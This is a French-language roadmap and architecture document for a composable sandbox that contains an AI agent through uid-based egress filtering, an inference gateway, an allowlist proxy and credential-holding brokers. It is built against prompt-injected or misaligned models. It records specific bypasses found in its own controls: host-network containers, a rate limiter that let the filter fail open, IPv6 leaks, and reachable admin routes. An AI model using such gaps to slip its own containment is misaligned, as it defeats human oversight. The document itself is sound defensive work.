# 📋 Roadmap & Architecture — Sandbox d'agent IA

Document récapitulatif : état déployé, modèle de composants, et feuille de route **dans l'ordre d'implémentation**.

> **Ce projet est une sandbox générique et composable**, pas une solution pour un cas d'usage particulier. Le socle (contrôle d'egress + gateway d'inférence) est toujours déployé ; le proxy L7 est la brique d'adaptation ; les brokers (Kubernetes, git) sont des **extensions optionnelles** ; et le harnais s'installe **en dernier**, une fois la sandbox prête. Voir §2.

---

## 🎯 0. Principes directeurs

### Objectif du projet

Fournir une **sandbox d'exécution pour agent IA**, réutilisable et opensourcable, avec trois propriétés non négociables :

1. **Harness-agnostic.** Hermes, OpenClaw, Smolagents, ou n'importe quoi d'autre. Le socle ne présuppose rien du harnais : il sécurise l'environnement d'exécution autour de lui, et l'installation est un **provider interchangeable**. `agent_name` est une variable (déjà propagée partout, ex. `podman_gvisor_agent_name: "{{ agent_name }}"`). Aucun chemin, nom d'unité ou utilisateur ne doit être codé en dur.
2. **Composable.** Chaque capacité est un rôle activable par un flag, dans le style existant (`gvisor_enabled`, `ollama_enabled`, `security_hardening_*_enabled`). Rien d'obligatoire au-delà du socle.
3. **Sans spécificité de déploiement.** Aucune valeur propre à une installation dans le code ou la doc : hôtes, IP, modèles, providers, allowlists, entrypoints et clés sont des variables. Un utilisateur doit pouvoir déployer sans modifier un template.

> **Le projet livre des implémentations, pas seulement des abstractions.** Exactement comme `ollama` est *une* implémentation possible de l'inférence (derrière la table d'alias du gateway), le projet **livrera un** provider d'installation de harnais (`harness_provider: hermes`), à créer en Phase 8. C'est une commodité assumée, pas une entorse au principe : le socle reste agnostique, et supporter un autre harnais consiste à ajouter un rôle provider — le chemin prévu, documenté en Phase 8.

### Ce que la sécurité doit réellement protéger

Le durcissement système actuel (SSH, fail2ban, auditd, AppArmor, sysctl, gVisor) protège bien **la VM**. Ce n'est pas là qu'est le risque principal.

La menace réelle : **le LLM est manipulé** (injection de prompt via du contenu non fiable, ou mésalignement) et utilise **ses propres pouvoirs légitimes**. Un agent injecté n'a pas besoin de s'échapper d'un conteneur — il a un shell et un accès réseau. Le durcissement système n'y répond pas ; la **limitation des pouvoirs** si.

### Les deux invariants

1. **Pas de droit d'application.** L'agent peut *proposer*, jamais *appliquer*. En GitOps, une branche ne déploie rien : le dommage exige un merge, et le merge est un geste humain. La protection de branche côté forge est le contrôle porteur.
2. **Aucun credential dans la zone où le modèle s'exécute.** Règle générale de composition :

> **Un composant vit dans la zone agent tant qu'il ne détient aucun secret. Dès qu'il en détient un, il rejoint la zone de confiance** — utilisateur système dédié, sans droits, qui n'exécute jamais de code produit par le modèle.

C'est cette règle qui rend le broker optionnel : s'il n'y a aucun secret à détenir, il n'y a pas de zone de confiance à déployer.

### Corrections de cadre (affirmations fausses du README/TODO actuel)

| Affirmation | Réalité |
|---|---|
| Le diagramme montre l'agent *dans* gVisor | gVisor (`runsc`) est le runtime **des conteneurs que l'agent lance** (`podman run`). Le processus agent tourne **nu** sur la VM. Rien ne le contraint aujourd'hui. |
| « Bloquer l'egress via UFW pour l'utilisateur de l'agent » | **UFW ne filtre pas par utilisateur** — il n'expose pas le match `owner`. Ça se fait en nftables (`meta skuid`) ou via `before.rules` (Phase 1). |
| « Le fournisseur d'inférence lié à `127.0.0.1` empêche l'exposition réseau » | Vrai pour l'**entrée**. Si le provider route vers un service distant, la sortie dépend du contrôle d'egress (Phase 1 → Phase 3). Le projet doit rendre les deux cas possibles. |
| Une allowlist git filtrée par méthode HTTP | `git clone` **et** `git push` sont tous deux des `POST` (`git-upload-pack` / `git-receive-pack`). Lecture/écriture se distinguent par le **chemin**, pas par la méthode. |

### Arbitrages documentés (génériques)

À ne pas re-litiger sans raison nouvelle. Laissés à l'appréciation de l'utilisateur, pas verrouillés par le projet.

- **Généricité de l'egress.** Un broker est spécifique à un cas d'usage ; un proxy à allowlist configurable est le primitif qui permet à **n'importe quel** déploiement de déclarer sa politique sans écrire de code. Les deux coexistent : le réseau (Phase 1) est le socle, le proxy (Phase 3) est la couche d'adaptation, les brokers (Phases 4-5) sont les intégrations étroites.
- **Inférence distante.** Si le provider est distant (API), le contenu des prompts sort du périmètre : la *destination* est filtrable par le proxy (niveau 1), le *contenu* ne l'est qu'avec interception TLS (niveau 2). Le projet ne l'interdit ni ne le favorise.
- **Une seule VM.** La frontière interne entre les deux zones est faible (même noyau). Acceptable tant qu'aucun secret d'infrastructure n'entre en jeu.
- **Jeton de forge injecté par proxy.** Jamais dans l'espace d'adressage du harnais, jamais dans son environnement. Le bornage vient de la protection de branche, pas du proxy.

- **Où vit un credential : chez qui peut le frapper.** Un jeton de ServiceAccount est frappé par le cluster — un coffre ne peut en être que le second domicile, et le livrer supposerait que la VM lise un Secret k8s, donc de percer le contrôle que le broker est censé fermer (Phase 4). Un mot de passe de base ou une clé d'API, c'est le déploiement qui les écrit : le coffre en est la source, et ESO les matérialise dans le cluster. Entre les deux, ce qui est frappé **une fois puis illisible** (un PAT de forge) : la seule copie restante est celle du déploiement, donc le coffre y est à sa place (Phase 5). La consommation est un axe séparé : le domicile se choisit à la source, la livraison dépend du consommateur.

---

## 🏗️ 1. État déployé

Le socle d'isolation multi-couches est en place. **« Déployé » ne veut pas dire « vérifié »** : aucun contrôle automatisé n'atteste l'état réel aujourd'hui — c'est l'objet de la Phase 7. (Le contrôle d'egress de la Phase 1 a été vérifié à la main, mesures à l'appui, mais rien ne l'atteste automatiquement : c'est exactement ce que la Phase 7 doit combler.)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  Proxmox VE (KVM Isolation + QEMU Guest Agent + Virtio-RNG)                  │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │  VM Ubuntu Server (UFW Rate-Limit + Fail2ban + Auto-Upgrades)          │  │
│  │                                                                        │  │
│  │   ZONE AGENT — NON FIABLE        uid={{ agent_name }} (0750)           │  │
│  │   • Harnais IA (processus nu, PAS dans gVisor) — installé en Phase 8   │  │
│  │   • Sudoers restreint : restart uniquement · limits.d anti-DoS         │  │
│  │   • Python via uv · Node.js via NVM · Docker/Compose compat            │  │
│  │   • Aucun credential (cible) · egress : loopback seul (fait, Ph. 1)    │  │
│  │   ┌───────────────────────────────────────────────────────────────┐   │  │
│  │   │  gVisor (runsc) — runtime OCI par défaut                       │   │  │
│  │   │  Sandbox des conteneurs LANCÉS PAR l'agent, pas de l'agent     │   │  │
│  │   └───────────────────────────────────────────────────────────────┘   │  │
│  │                                                                        │  │
│  │   ZONE DE CONFIANCE   uid={{ broker_name }} (0700, nologin)            │  │
│  │   Tout composant qui détient un secret. N'exécute jamais de code       │  │
│  │   produit par le modèle.                                               │  │
│  │   • Gateway d'inférence  → provider, clé détenue (fait, Ph. 2)         │  │
│  │   • Proxy egress L7      → internet, allowlist (fait, Ph. 3)           │  │
│  │   • Broker Kubernetes    → kube-apiserver, jeton RO (fait, Ph. 4)      │  │
│  │   • Broker git           → forge, clé ré-originée (fait, Ph. 5)        │  │
│  │   • Proxy d'injection    → API + LFS, jeton injecté (fait, Ph. 5)      │  │
│  │   • Observabilité        → Prometheus/AM/Grafana, RO (fait, Ph. 5)     │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
```

Le proxy L7 est la **brique d'adaptation** : elle permet de déclarer une politique d'egress par déploiement, sans écrire de code — ce qui est nécessaire pour couvrir des cas d'agent hétérogènes.

### Protections déjà actives

1. **Provisioning Proxmox (OpenTofu)** : Cloud-Init, GPU/PCI Passthrough, `qemu-guest-agent`, Virtio-RNG.
2. **Isolation noyau (gVisor)** : conteneurs dans le micro-noyau `4.19.0-gvisor`.
3. **Hardening SSH** : mot de passe désactivé, root interdit, `AllowUsers` strict, crypto post-quantique, `AllowTcpForwarding no`, `AllowAgentForwarding no`.
4. **Hardening Kernel & OS** : ASLR complet, `yama.ptrace_scope=1`, anti-DoS réseau, anti-spoofing, core dumps désactivés, blacklist `dccp`/`sctp`/`rds`/`tipc`/`firewire`, umask `027`.
5. **Surveillance** : fail2ban + action UFW, `unattended-upgrades` + `apt-daily.timer`, auditd, AppArmor enforce, `libpam-pwquality`.
6. **Utilisateur harnais** : non-root, home `0750`, linger systemd. Le sudoers scopé (`systemctl restart`) référence une unité qui n'existe qu'à partir de la Phase 8.
7. **Egress de la zone agent** : filtré par uid (table nftables `agent_egress`, chargée par `agent-egress.service`) — loopback seul, résolution de noms comprise, conteneurs couverts. Appliqué en dernier rôle du play ; voir Phase 1 pour l'ordre et la fenêtre assumée.
8. **Gateway d'inférence** (`inference-gateway.service`) : porte d'entrée loopback portée par la **zone de confiance** (`broker`), table d'alias obligatoire — l'agent nomme un rôle, jamais un modèle du provider — et clé du provider détenue par le gateway. Le port amont du provider est fermé à la zone agent, donc le gateway est le seul chemin vers un modèle.
9. **Proxy egress L7** (`egress-proxy.service`, `agent_egress_proxy_enabled`) : la **seule** sortie de la zone agent vers le web, allowlist déclarée par le déploiement, destinations internes refusées, une ligne de journal par requête. Le niveau 1 ne demande aucune CA ; le niveau 2 (interception TLS, opt-in) ajoute les chemins et l'inspection au prix de la distribution d'une CA interne.
10. **Broker Kubernetes** (`k8s-broker.service`, `k8s_broker_enabled`) : le **seul** chemin de la zone agent vers un cluster, sous forme de `kubectl proxy` loopback porté par la zone de confiance, alimenté par un kubeconfig de ServiceAccount en lecture seule qui n'entre jamais dans la zone agent. L'agent reçoit une adresse (`127.0.0.1:8001`) et un `token: ignore` ; les méthodes d'écriture et les chemins `exec`/`attach`/`portforward`/`secrets` sont refusés par le proxy, et le jeton n'a aucun verbe d'écriture.
11. **Broker git** (`git-broker-ssh.service`, `git_broker_enabled`) : le git **natif** de l'agent, sous une façade SSH loopback dont l'unique utilisateur a pour shell un relais qui **ré-origine** chaque session vers la forge avec la clé du déploiement. L'agent ne détient qu'une clé factice (`~/.ssh/id_ed25519_placeholder`, alias `git-broker`), et le relais refuse — en le journalisant — tout ce qui n'est pas un verbe git sur un dépôt déclaré.
12. **Proxy d'injection** (`token-proxy.service`, `token_proxy_enabled`) : le **primitif** des credentials qui ne passent pas par du git — un nginx inverse loopback, sous l'uid de la zone de confiance, qui sert une **liste d'endpoints déclarée** en réécrivant l'en-tête d'authentification. Le broker git l'alimente (API de la forge : PR, statut CI ; et LFS), et le prochain service interne n'aura qu'à se déclarer.
13. **Relais d'observabilité** (`observability_relay`, `observability_relay_enabled`) : la même primitive, déclarée trois fois — Prometheus, Alertmanager, Grafana — pour que l'agent **lise** ce que sa pile rapporte : ce qui sonne, quelles cibles sont tombées, le dashboard d'un service. Lecture seule **par la méthode** (`GET`), trois lectures dangereuses fermées par leur nom (le tunnel de sources de données de Grafana, les configurations chargées), et un seul credential — un jeton de compte de service Grafana au rôle Viewer, détenu par la zone de confiance. Prometheus et Alertmanager n'ont **aucune** authentification : la liste de préfixes est alors leur seule borne, et c'est écrit tel quel plutôt que présenté comme un contrôle amont.

---

## 🧩 2. Modèle de composants

Chaque composant est un rôle activable, dans le style existant.

| Composant | Rôle | Flag | Requis |
|---|---|---|---|
| Contrôle de l'egress par uid | `agent_egress` | `agent_egress_filter_enabled` | **Socle** |
| Gateway d'inférence | `inference_gateway` | `inference_gateway_enabled` | **Socle** |
| Provider d'inférence local (Ollama) | `ollama` *(existant)* | `ollama_enabled` | Optionnel |
| Proxy egress L7 (niveau 1 : allowlist) | `agent_egress_proxy` | `agent_egress_proxy_enabled` | Brique d'adaptation |
| Inspection TLS (niveau 2) | `agent_egress_proxy` *(même rôle)* | `agent_egress_proxy_tls_intercept` | Opt-in |
| Broker Kubernetes (lecture seule) | `k8s_broker` | `k8s_broker_enabled` | Extension |
| Broker git (branches, push, PR, LFS) | `git_broker` | `git_broker_enabled` | Extension |
| Relais d'observabilité (lecture seule) | `observability_relay` | `observability_relay_enabled` | Extension, par le même primitif |
| Proxy d'injection de credential | `token_proxy` | `token_proxy_enabled` | Primitive, alimentée par les brokers et les relais |
| Installation du harnais (provider livré) | `harness_hermes` | `harness_provider: hermes` | Phase 8, **à créer** |
| Sécurisation du harnais (unité systemd) | `harness_service` | `harness_service_enabled` | Phase 8 |
| Zone de confiance (utilisateur système) | `trust_zone` | `trust_zone_enabled` | Dépendance du gateway et des brokers |

**Exemples d'assemblages visés :**

- *Agent conversationnel* : zone agent + conteneurs + gateway d'inférence.
- *Agent avec navigation web* : socle + proxy L7 niveau 1, allowlist déclarée par le déploiement.
- *Agent SRE k3s* : socle + `k8s_broker` + `git_broker`.
- *Agent avec API d'inférence distante* : socle, la clé restant dans la zone de confiance.

### Variables (conventions existantes)

```yaml
# --- Zone agent (existant, agnostique) ---
agent_name: "agent"                # agent, sre-agent, sandbox1, ...
# L'entrypoint est la seule chose à renseigner côté harnais (Phase 8) :
# harness_exec_start: "/usr/local/bin/uv run python main.py"

# --- Socle ---
agent_egress_filter_enabled: true   # filtre l'egress de la zone agent (loopback seul)

# --- Zone de confiance ---
broker_name: "broker"               # utilisateur système ; tout composant qui détient un secret

# --- Inférence : le provider est un choix de l'utilisateur ---
inference_gateway_enabled: true
inference_gateway_port: 4000
inference_gateway_upstream_url: "http://127.0.0.1:11434"  # amont local ; son port est fermé à l'agent
# Table d'alias obligatoire : alias vu par l'agent -> modèle réel du provider. Le préfixe
# choisit l'endpoint amont (ollama_chat/ pour le chat, ollama/ pour les embeddings).
inference_gateway_models:
  - alias: reasoning
    model: "ollama_chat/<modèle-de-raisonnement>"
#   - alias: reasoning
#     model: "deepseek/<modèle>"      # la clé est détenue par le gateway, jamais par le harnais
#     api_key: "<clé>"
inference_gateway_debug_logging: false  # flux de débogage, pas une piste d'audit

# --- Proxy egress L7 (brique d'adaptation) ---
agent_egress_proxy_enabled: false       # false : la zone agent n'a aucun egress web
agent_egress_proxy_port: 8080
# [.]hôte[:port][/chemin] : point initial = sous-domaines, sans port = 80 et 443, chemin = niveau 2.
agent_egress_proxy_allowlist: []
agent_egress_proxy_tls_intercept: false # niveau 2 : interception TLS (CA interne, cert pinning cassé)

# --- Extensions optionnelles ---
k8s_broker_enabled: false           # broker Kubernetes en lecture seule, porté par la zone de confiance
k8s_broker_port: 8001
# Kubeconfig du ServiceAccount : un secret, donc un fichier hors dépôt, pas une variable.
k8s_broker_kubeconfig_src: "{{ inventory_dir }}/../files/k8s-broker.kubeconfig"
# --- Extension : broker git (transport SSH ré-originé) ---
git_broker_enabled: false
git_broker_ssh_port: 2222           # façade SSH loopback : l'agent garde un git natif
git_broker_forge_ssh_user: git      # la même forme sur Forgejo, GitLab et GitHub
git_broker_forge_ssh_host: ""
git_broker_forge_ssh_port: 22       # ssh.github.com sert 443 quand 22 est filtré
git_broker_repos: []                # les seuls dépôts atteignables : ["owner/repo.git"]
git_broker_forge_host_key: ""       # la ligne known_hosts de la forge, épinglée (ssh-keyscan)
# La clé de déploiement (écriture, scopée au dépôt) : un secret — générée sous output/ si absente.
git_broker_ssh_key_src: "{{ playbook_dir }}/output/git-broker.key"
# La moitié HTTP : l'API de la forge (PR) et LFS, servies par le proxy d'injection.
git_broker_api_upstream: ""
git_broker_api_repo_prefix: /api/v1/repos/   # GitLab : /api/v4/projects/ ; GitHub : /repos/
git_broker_api_auth_header: "Authorization: token TOKEN"   # GitHub : Bearer ; GitLab : PRIVATE-TOKEN
git_broker_lfs_enabled: true
git_broker_lfs_basic_user: ""       # LFS attend Basic <base64(utilisateur:jeton)>
git_broker_token_src: "{{ inventory_dir }}/../files/git-broker.token"
# Le primitif : une liste d'endpoints à injecter, aucune connaissance d'une forge.
token_proxy_enabled: false
token_proxy_port: 8002

# --- Extension : relais d'observabilité (lecture seule, par le même primitif) ---
observability_relay_enabled: false
observability_relay_prometheus_upstream: ""      # https://prometheus.example.com
observability_relay_alertmanager_upstream: ""    # aucune auth en amont : les préfixes sont la borne
observability_relay_grafana_upstream: ""         # lui authentifie : compte de service au rôle Viewer
observability_relay_grafana_token_src: "{{ inventory_dir }}/../files/grafana.token"

# --- Harnais (Phase 8) : installation (provider) puis sécurisation ---
harness_provider: "hermes"          # "hermes" (rôle livré) ou "none" (installation manuelle)
# harness_exec_start: "..."         # prioritaire sur le défaut du provider
harness_service_enabled: true
```

> **Pourquoi `agent_egress_proxy_enabled: false` par défaut.** La Phase 1 laisse déjà la zone agent sans aucun egress hors loopback. Le socle donne donc l'accès à l'inférence *via le gateway* (loopback) sans ouvrir le réseau. L'egress web est un **opt-in explicite** : c'est le déploiement qui décide de sa politique, pas le projet.

---

## 🗺️ 3. Feuille de route

### Socle

#### ✅ Phase 0 — Corrections documentaires *(faite)*

- [x] Corriger les quatre affirmations du §0 dans le README et ce TODO.
- [x] Retirer du README la roadmap obsolète (« L7 Egress Proxy, Zero-Secret credential injection ») et la remplacer par le renvoi à §2.
- [x] Vérifier qu'aucune valeur propre à un déploiement ne figure dans les templates ou la doc.
  - **Corrigé** : `ollama_models` livrait `kimi-k2.7-code:cloud` (README + `all.yml.example`) → petit modèle local par défaut, les modèles distants passent en commentaire.
  - **Corrigé** : `variable "vm_config"` portait une topologie de VM **en défaut** (`vm-ai` sur `pve-node1`, `10.0.0.1/24`, `vlan_id 100`). Défaut supprimé → la variable devient requise ; la topologie vient de `terraform.tfvars`, où elle appartient.
  - **Laissé volontairement** : les IP d'exemple dans les `description` de `variables.tf` et dans `terraform.tfvars.example`. Un fichier d'exemple est fait pour ça, et ce ne sont pas des valeurs de déploiement réelles.

**Pourquoi en premier :** ces affirmations fausses créent un faux sentiment de sécurité — précisément ce qui fait qu'on ne met pas en place le contrôle qui manque.

#### ✅ Phase 1 — Contrôle de l'egress par uid *(faite)*

L'allowlist devient **structurelle** (topologie) au lieu d'être content-based : si la zone agent n'a pas de route, il n'y a rien à filtrer au L7. C'est le socle de la Phase 3.

**Ne dépend que de l'uid du harnais** (`agent_user` est déployé), pas de l'installation du harnais ni de son unité (Phase 8).

**Option A retenue** — table nftables dédiée, testable seule, indépendante d'UFW. UFW garde l'ingress et son propre OUTPUT ; les deux coexistent.

**Règles déployées.** Le snippet initial était incomplet sur trois points — IPv6, plages subuid, DNS — tous corrigés :

```nft
table inet agent_egress {
  chain output {
    type filter hook output priority -50; policy accept;

    # Aucune résolution de noms : le stub loopback relaie en amont sous son propre uid.
    meta skuid { <uids> } ip daddr 127.0.0.0/8 udp dport 53 counter drop
    meta skuid { <uids> } ip daddr 127.0.0.0/8 tcp dport 53 counter drop
    meta skuid { <uids> } ip6 daddr ::1 udp dport 53 counter drop
    meta skuid { <uids> } ip6 daddr ::1 tcp dport 53 counter drop

    # Loopback uniquement. Le `drop` a lieu dans le hook output local : l'émetteur
    # échoue immédiatement et rien ne fuit en réponse.
    # Le log throttlé est une règle SÉPARÉE : `limit` est un match, donc dans la
    # règle de drop il ferait sauter le drop au-delà du seuil (filtre ouvert).
    meta skuid { <uids> } ip daddr != 127.0.0.0/8 \
      limit rate 6/minute burst 12 packets log prefix "agent-egress-drop: "
    meta skuid { <uids> } ip daddr != 127.0.0.0/8 counter drop
    meta skuid { <uids> } ip6 daddr != ::1 counter drop
  }
}
```

`<uids>` = uid du harnais **+ ses plages subuid**, résolus à l'exécution (`id -u`, `/etc/subuid`) : l'uid n'est pas fixé par `agent_user`.

**Ce que les mesures ont établi** — plusieurs hypothèses sont tombées :

| Point | Résultat mesuré |
|---|---|
| Ordre des hooks | UFW est en `priority filter` (= 0) : le `drop` à `-50` passe avant et est **terminal**. UFW ne peut pas le court-circuiter. Vérifié. |
| Conteneurs (réseau propre) | Atteignent l'extérieur filtre levé, **timeout filtre actif** (A/B) : `meta skuid` couvre pasta/netavark. |
| Contournement `--network=host` | **Réel** : uid hôte mesuré **100999** (plage subuid), pas celui du harnais. Chemin mort avec `runsc` (défaut), mais **vivant avec `gvisor_default: false`** — et c'est l'inclusion subuid qui le bloque. |
| Latence | Résolution bloquée mesurée à **~0 s** : le `drop` en hook output fait échouer `sendto` immédiatement. Le « ~5 s » supposé était faux. |
| Limiteur de log | `limit` est un **match** : placé dans la règle de drop, il fait sauter le `drop` au-delà du seuil — le filtre échouait **ouvert**. Mesuré sous charge : **37 paquets sur 50 acceptés**. Le log throttlé est donc une règle à part, et le `drop` inconditionnel. |
| Volume de test | Le défaut ci-dessus est passé inaperçu parce que tous les tests étaient à faible volume, sous le seuil du limiteur. **Tout limiteur de débit doit être testé au-dessus de son seuil.** |
| IPv6 | `ip daddr` ne matche que l'IPv4 : sans `ip6 daddr != ::1`, l'agent sort par IPv6. |

**Ordre dans le play : `agent_egress` est le DERNIER rôle** ; les `pre_tasks` lèvent le filtre pour la durée du run.

- [x] **Pas de migration UFW → nftables** : UFW reste pour l'ingress (fail2ban dépend de son action), l'egress par uid s'ajoute à côté.
- [x] Uid **numériques** dans la conf finale.
- [x] `agent_egress_filter_enabled: false` retire table, unité et fichier (vérifié : egress de l'agent rouvert).
- [x] Interaction UFW ↔ nftables vérifiée empiriquement, **reboot compris**.
- [x] Persistance par `agent-egress.service` dédiée (`oneshot`, `Before=network.target`), **jamais `nftables.service`** : le `/etc/nftables.conf` stock commence par `flush ruleset` et effacerait UFW au boot.
- [x] `ExecStartPost` vérifie que la table est chargée : un échec ne peut pas laisser la zone ouverte en silence.

**Le piège qui a failli passer.** Une unité `oneshot` + `RemainAfterExit` reste « active » indéfiniment : la table détruite par la levée n'était **pas** réappliquée, pendant que `systemctl is-active` répondait `active`. Le rôle lit désormais **la table vivante**. Un contrôle de sécurité doit vérifier l'**effet**, pas l'état déclaré.

**Fenêtre assumée.** Un run qui échoue avant le dernier rôle laisse la zone agent ouverte jusqu'au run suivant — prix de ce choix, retenu parce que le provisioning installe `nvm`/`npm` **en tant que harnais** et a besoin du réseau. La Phase 7 **doit** donc asserter dans `make audit` que la table est chargée, sinon la fenêtre est indétectable.

**Suites.** Phase 3 : le blocage DNS **reste** — le résolveur en zone de confiance annoncé ici ne s'est pas révélé nécessaire, et la raison est écrite au §4. Phase 8 : l'unité du harnais devra déclarer `After=agent-egress.service` — la couche `IPAddressDeny` reste utile en complément, elle ne remplace pas ce rôle.

**Constaté au passage, non traité ici :**

- **`-e agent_egress_filter_enabled=false`** passe la *chaîne* `"false"`, qu'Ansible refuse comme conditionnel. Utiliser la forme JSON. Vaut pour tous les flags `*_enabled`.
- **`nvm` exécute `npm update -g` sans condition** à chaque run : c'est ce qui rend la levée du filtre nécessaire, et une surface de supply chain à revoir (Phase 6).
- **`sudo -u {{ agent_name }}` depuis `/home/ubuntu`** échoue (`0750` sur les deux homes) : préfixer par `cd /tmp` ou `-H`.

#### ✅ Phase 2 — Gateway d'inférence *(faite)*

Composant qui rend le **provider d'inférence interchangeable** et qui soustrait au harnais jusqu'au **nom** des modèles : l'agent demande un rôle (`reasoning`, `execution`), la table d'alias traduit vers le modèle réel. Changer de provider ne touche pas la configuration de l'agent.

Implémentation : **litellm** (`inference-gateway.service`), HTTP simple sur `127.0.0.1:4000`, sans CA ni interception TLS (niveau 2 = Phase 3).

- [x] Reverse proxy loopback, HTTP simple : le provider peut être local (Ollama) ou distant, et c'est le gateway qui fait le TLS amont.
- [x] **Clé du provider détenue par le gateway**, référencée en `os.environ/...` depuis un fichier d'environnement en `0600` : ni dans le config, ni dans un diff, ni dans l'espace du harnais.
- [x] **Table d'alias obligatoire** — alias vu par l'agent → modèle réel. Un modèle non déclaré est refusé en **400** (`ProxyModelNotFoundError`) : c'est une allowlist stricte, sans mécanisme séparé.
- [x] **Zone de confiance** : le gateway tourne sous `broker`, jamais sous l'uid du harnais, **même sans clé** — un seul chemin de code, et l'agent ne peut ni l'arrêter ni lire sa config.
- [x] **Port amont fermé à la zone agent** (`agent_egress_blocked_loopback_ports`, dérivé de `inference_gateway_upstream_url`) : sans ça l'agent appelle Ollama en direct et la table d'alias ne restreint rien.
- [x] `inference_gateway_enabled: false` retire unité, config et venv **et rouvre le port amont** (vérifié). Rebond après reboot et réversibilité vérifiés sur la VM.
- [x] Le rôle `ollama` existant reste **inchangé** : le gateway est une couche au-dessus, pas un remplacement.

**Deux pièges d'ordre, trouvés par les tests de réversibilité :**

- **`trust_zone` tourne avant ses dépendants**, donc au tear-down `userdel` échoue (« user broker is currently used by process N ») : le service du gateway tourne encore sous cet uid. Le rôle arrête donc les unités listées dans `trust_zone_dependent_units` avant de supprimer le compte — vérifié : plus aucun processus sous un uid supprimé après coup.
- **Zone désactivée alors que le gateway la réclame** : le play échoue **proprement**, avec un message qui dit quoi faire (`trust_zone_enabled`, ou `inference_gateway_user`). Un échec bruyant vaut mieux qu'une unité déployée avec un `User=` inexistant.

**Ce que les mesures ont établi** — trois leviers supposés se sont révélés **inertes**, et c'est le genre d'erreur qui ne se voit pas à l'œil nu :

| Point | Résultat mesuré |
|---|---|
| Préfixe du provider | `ollama_chat/` frappe `/api/chat` (tool calling) ; `ollama/` frappe `/api/generate` — et **l'endpoint embeddings n'est mappé que pour `ollama/`**. Un préfixe unique ne peut donc pas servir un modèle de chat **et** un modèle d'embedding : le préfixe se déclare **par alias**. Constaté en 400 « Unmapped LLM provider for this endpoint ». |
| Quotas `rpm`/`tpm` | **Non appliqués** : 80 requêtes parallèles, 80 × 200. Ce sont des entrées de *routage*, pas un limiteur. |
| `max_parallel_requests` + `enable_pre_call_checks` | **Non appliqués** : 6 concurrentes passées pour une limite de 4. |
| `global_max_parallel_requests` | **Non appliqué** : 6 concurrentes pour une limite de 3. |
| `turn_off_message_logging` | Rien de visible ; `DETAILED_DEBUG` journalise bien le prompt (**5 occurrences**), mais au prix de **135 lignes de journal pour une seule requête** d'embedding. Flux de débogage, pas piste d'audit → le flag porte son vrai nom. |
| Interpréteur du venv | `uv` installe CPython sous **`/root`**, hors de portée de `broker` — et `ProtectHome=true` masque `/root` de toute façon. Le venv reste **root-owned** pour que le service ne puisse pas réécrire le code qu'il exécute (`ProtectSystem=strict`) : `UV_PYTHON_INSTALL_DIR` déplace l'interpréteur, et le groupe donne la lecture seule. |

**Ordre dans le play** : `trust_zone` puis `inference_gateway`, après `ollama` et avant `agent_egress` qui reste **dernier**.

**Corrigé après une review externe :** `api_base` n'est plus appliqué qu'aux modèles du provider **local** (`ollama`/`ollama_chat`) — un modèle distant partait sinon vers l'URL locale d'Ollama ; les règles de blocage du port amont couvrent désormais **IPv6** (`ip6 daddr ::1`, compteur vérifié à 4 paquets) alors que la leçon IPv6 de la Phase 1 n'y avait pas été appliquée ; un **pré-vol** dans `pre_tasks` valide la table d'alias **avant** la levée du filtre, pour qu'un run voué à l'échec n'ouvre pas la zone agent ; `broker_name == agent_name` est refusé (les deux zones fusionneraient sous un uid).

**Deux points de cette review ont été rejetés, mesures à l'appui** — à ne pas re-litiger sans fait nouveau :

| Point | Ce qui a été mesuré |
|---|---|
| Entourer les clés de guillemets dans `gateway.env` (« un `#` interne serait vu comme un commentaire ») | **Faux** : `PLAIN=ab#cd ef` se charge en `[ab#cd ef]`. Et la correction **dégraderait** le cas réel : un espace de fin collé avec la clé est supprimé sans guillemets (`[abc]`) mais **préservé** avec (`[abc ]`), ce qui casserait l'authentification. |
| Conditionner le chown récursif du venv à la version installée (« 30-60 s par run ») | **2,05 s** mesurées pour **20 018 fichiers**. Et le gating rouvrirait le trou « groupe changé, version inchangée » : `broker_name` modifié → accès perdu sans que rien ne le signale. |

**Défaut trouvé en corrigeant :** `.version` était écrit **après** le chown récursif, donc le run suivant devait rattraper — idempotence décalée d'un run à chaque changement de version. Le chown est désormais la dernière étape du bloc.

**Ce qui reste dehors, et pourquoi :**

- **Ordre canonique du préfixe** et **compression de la partie volatile** : ce sont des contrats du **harnais** — c'est le client qui construit la requête. Un proxy qui réécrit le contenu envoyé est un piège de débogage. À documenter en Phase 8, pas à implémenter ici.
- **Quotas de tokens** : litellm ne les applique pas sans Redis (suivi d'usage) ni base de données (budgets, clés virtuelles). Ce serait un composant de plus, avec son propre secret, pour une borne que la Phase 7 peut obtenir par l'observation. Décision : **pas de quota**, mesures ci-dessus à l'appui.
- **Redaction** : `turn_off_message_logging: true` est le défaut, mais aucun callback n'est configuré — c'est une protection **prospective**, pas un contrôle actif. Dit tel quel plutôt que présenté comme acquis.
- **Inférence cloud sans compte Ollama** : un modèle `:cloud` s'enregistre sans compte (`ollama pull` le déclare), mais l'inférence en exige un — mesuré le 20/09/2026, `POST /v1/chat/completions` sur un alias cloud répond **401**, relayé fidèlement par le gateway, parce que `ollama_signin_required: false` et aucune `api_key` par entrée. **Choix assumé** : la connexion est interactive, donc incompatible avec un provisionnement automatique. Un modèle strictement local n'est pas concerné — et la chaîne agent → gateway → amont, elle, est prouvée par ce même échange.

**Trouvaille à traiter en Phase 7.** Les routes d'administration de litellm sont sur le loopback, donc **joignables par l'agent** (`/health`, `/metrics`, `/key/*`). Sans base de données, `model_list` n'est pas modifiable à chaud et la clé du provider n'est jamais renvoyée : l'impact est faible, mais c'est un chemin que l'agent a et que `make audit` doit connaître. L'UI d'admin est désactivée.

### Brique d'adaptation

#### ✅ Phase 3 — Proxy egress L7 *(faite)*

**Pourquoi cette brique dans un projet générique.** On ne peut pas prédire ce dont chaque harnais a besoin. Un broker est spécifique à un cas d'usage (Kubernetes, git) ; un proxy à allowlist configurable est le primitif qui permet à **n'importe quel** déploiement de déclarer sa politique d'egress **sans écrire de code**. C'est ce qui rend le projet capable de protéger des cas d'agent hétérogènes.

Implémentation : **mitmproxy 12.2.3** (`mitmdump`, mode *regular*), `egress-proxy.service`, HTTP sur `127.0.0.1:8080`, sous l'utilisateur de la zone de confiance. Deux niveaux, activables séparément — leur coût n'a rien à voir :

| | Niveau 1 — défaut | Niveau 2 — `_tls_intercept: true` |
|---|---|---|
| Politique | destination (hôte, port) | destination **et** chemin |
| TLS | passé à travers, **jamais terminé** | terminé avec une CA interne |
